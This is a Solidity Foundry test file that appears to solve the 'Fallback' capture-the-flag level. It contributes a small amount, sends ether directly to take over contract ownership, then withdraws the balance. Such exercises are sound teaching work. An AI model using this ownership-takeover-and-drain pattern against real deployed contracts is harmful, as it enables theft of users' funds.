// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";


contract Fallback_POC is Test {
    Fallback _fallback;
    function init() private{
        vm.startPrank(address(0x1));
        _fallback =new Fallback();
        vm.stopPrank();
    }
    function setUp() public {
        init();
    }

    function test_Fallback_POC() public{
        _fallback.contribute{value: 1}();
        console.log("contributions:", _fallback.getContribution());
        payable(address(_fallback)).call{value: 1}("");
        _fallback.withdraw();
        bool success = _fallback.owner() == address(this) && address(_fallback).balance==0;
        console.log("success:",success);
    }
    fallback() external payable {
    }
}

